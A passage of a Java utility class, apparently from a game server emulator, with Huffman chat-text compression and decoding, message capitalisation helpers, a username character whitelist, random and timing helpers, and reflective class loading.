					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x2) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x1) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
			}
			return sb.toString();
		} catch (Throwable e) {
		}
		return "Cabbage";
	}

	public static String decompressMessageHuffman(byte[] message, int length) {
		try {
			int charsDecoded = 0;
			int keyIndex = 0;
			StringBuilder sb = new StringBuilder();
			for (int offset = 0; true; offset++) {
				byte character = message[offset];
				if (character >= 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				int charId;
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x40) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x20 & character) == 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x10 & character) == 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x8 & character) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x4 & character) == 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x2) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x1) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
			}
			return sb.toString();
		} catch (Throwable e) {
		}
		return "Cabbage";
	}

	/**
	 * Compresses text using the huffman algorithm.
	 *
	 * @param text        The text to pack.
	 * @param dest        The array to write to.
	 * @param startOffset The start offset from where to write to the destination array.
	 * @return The number of bytes written.
	 */
	public static int huffmanCompress(String text, byte[] dest, int startOffset) {
		try {
			int key = 0;
			int position = startOffset << 3;
			for (int i = 0; i < text.length(); i++) {
				int character = text.getBytes()[i] & 0xff;
				int mask = HUFFMAN_MASKS[character];
				int size = HUFFMAN_BIT_SIZES[character];
				int offset = position >> 3;
				int bitOffset = position & 0x7;
				key &= (-bitOffset >> 31);
				position += size;
				int byteSize = (((bitOffset + size) - 1) >> 3) + offset;
				bitOffset += 24;
				dest[offset] = (byte) (key = (key | (mask >>> bitOffset)));
				if (byteSize > offset) {
					offset++;
					bitOffset -= 8;
					dest[offset] = (byte) (key = mask >>> bitOffset);
					if (byteSize > offset) {
						offset++;
						bitOffset -= 8;
						dest[offset] = (byte) (key = mask >>> bitOffset);
						if (byteSize > offset) {
							bitOffset -= 8;
							offset++;
							dest[offset] = (byte) (key = mask >>> bitOffset);
							if (offset < byteSize) {
								bitOffset -= 8;
								offset++;
								dest[offset] = (byte) (key = mask << -bitOffset);
							}
						}
					}
				}
			}
			return (7 + position >> 3) - startOffset;
		} catch (Throwable e) {
		}
		return 0;
	}

	public static String decompressHuffman(IncomingPacket packet, int numChars) {
		byte[] textBuffer = new byte[packet.remaining()];
		packet.readBytes(textBuffer, packet.remaining());
		return decompressHuffman(textBuffer, numChars);
	}

	public static String optimizeText(String text) {
		StringBuilder sb = new StringBuilder();
		char buf[] = text.toCharArray();
		boolean wasSpace = false;
		boolean firstChar = false;
		boolean lastEndMark = false;
		for (char c : buf) {
			if (!firstChar) {
				if (c != ' ') {
					firstChar = true;
					wasSpace = c == ':' || c == ';';
					sb.append(Character.toUpperCase(c));
				}
				continue;
			}
			if (!wasSpace && Character.isUpperCase(c)) {
				c = Character.toLowerCase(c);
			}
			if (lastEndMark) {
				c = Character.toUpperCase(c);
			}
			sb.append(c);
			wasSpace = c == ' ' || c == ':' || c == ';';
			lastEndMark = c == '.' || c == '!' || c == '?';
		}
		return sb.toString();
	}

	public static String fixChatMessage(String message) {
		StringBuilder newText = new StringBuilder();
		boolean wasSpace = true;
		for (int i = 0; i < message.length(); i++) {
			if (wasSpace) {
				newText.append(("" + message.charAt(i)).toUpperCase());
				if (!String.valueOf(message.charAt(i)).equals(" "))
					wasSpace = false;
			} else
				newText.append(("" + message.charAt(i)).toLowerCase());
			if (String.valueOf(message.charAt(i)).contains(".")
					|| String.valueOf(message.charAt(i)).contains("!")
					|| String.valueOf(message.charAt(i)).contains("?"))
				wasSpace = true;
		}
		return newText.toString();
	}

	/**
	 * An array of valid characters (ex. username, pm, ...).
	 */
	public static final char[] VALID_CHARS = {'_', ' ', 'a', 'b', 'c', 'd',
			'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
			'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
			'4', '5', '6', '7', '8', '9'};

	/**
	 * Checks if a character is valid to use.
	 *
	 * @param c The character.
	 * @return {@code True} if so.
	 */
	public static boolean allowed(char c) {
		return (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_'
				|| c == ' ';
		/*
		 * for (char c2 : VALID_CHARS) if (c == c2) return true; return false;
		 */
	}

	/**
	 * @param minimum
	 * @param maximum
	 * @return
	 */
	public static int random(int min, int max) {
		final int n = Math.abs(max - min);
		return Math.min(min, max) + (n == 0 ? 0 : random(n));
	}

	private static long timeCorrection;

	private static long lastTimeUpdate;

	public static synchronized long currentTimeMillis() {
		long l = System.currentTimeMillis();
		if (l < lastTimeUpdate)
			timeCorrection += lastTimeUpdate - l;
		lastTimeUpdate = l;
		return l + timeCorrection;
	}

	private static Random random;

	public static final Random getRandomGenerator() {
		return random == null ? random = new Random() : random;
	}

	public static StringParser parser = null;

	public static Configuration conf = null;

	public static String parseString(String string) {
		return parser.parseString(string);
	}

	public static final int getDistance(int coordX1, int coordY1, int coordX2,
	                                    int coordY2) {
		int deltaX = coordX2 - coordX1;
		int deltaY = coordY2 - coordY1;
		return ((int) Math.sqrt(Math.pow(deltaX, 2) + Math.pow(deltaY, 2)));
	}

	/**
	 * Gets the force movement direction value.
	 *
	 * @param location The start location.
	 * @param dest     The destination.
	 * @return The force movement location.
	 */
	public static int forceDir(Location location, Location dest) {
		Location delta = Location.getDelta(location, dest);
		if (delta.getX() < 0) {
			if (delta.getY() < 0) {
				return delta.getX() < delta.getY() ? 3 : 2;
			}
			return -delta.getX() > delta.getY() ? 3 : 0;
		}
		if (delta.getY() < 0) {
			return delta.getX() < delta.getY() ? 1 : 2;
		}
		return -delta.getX() > delta.getY() ? 1 : 0;
	}

	public static List<Object> getClasses(String packageName) {
		try {
			ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
			assert classLoader != null;
			String path = packageName.replace('.', '/');
			Enumeration<URL> resources = classLoader.getResources(path);
			List<File> dirs = new ArrayList<>();
			while (resources.hasMoreElements()) {
				URL resource = resources.nextElement();
				dirs.add(new File(resource.getFile().replaceAll("%20", " ")));
			}
			List<Class> classes = new ArrayList<>();
			for (File directory : dirs) {
				classes.addAll(findClasses(directory, packageName));
			}
			List<Object> list = new ArrayList<>();
			for (Class clazz : classes) {
				if (clazz.isAnnotation()) {
					continue;
				}
				list.add(clazz.newInstance());
			}
			return list;
		} catch (IllegalAccessException | InstantiationException | IOException e) {
			e.printStackTrace();
			return Collections.EMPTY_LIST;
		}
	}

	private static List<Class> findClasses(File directory, String packageName) {
		List<Class> classes = new ArrayList<>();
		if (!directory.exists()) {
			return classes;
		}
		File[] files = directory.listFiles();
		if (files == null) {
			return classes;
		}
		for (File file : files) {
			if (file.getName().contains("$")) {
				continue;
			}
			if (file.isDirectory()) {
				assert !file.getName().contains(".");
				classes.addAll(findClasses(file, packageName + "." + file.getName()));
			} else if (file.getName().endsWith(".class")) {
				try {
					classes.add(Class.forName(packageName + '.' + file.getName().substring(0, file.getName().length() - 6)));
				} catch (Throwable e) {
					e.printStackTrace();
				}
			}
		}
		return classes;
	}
}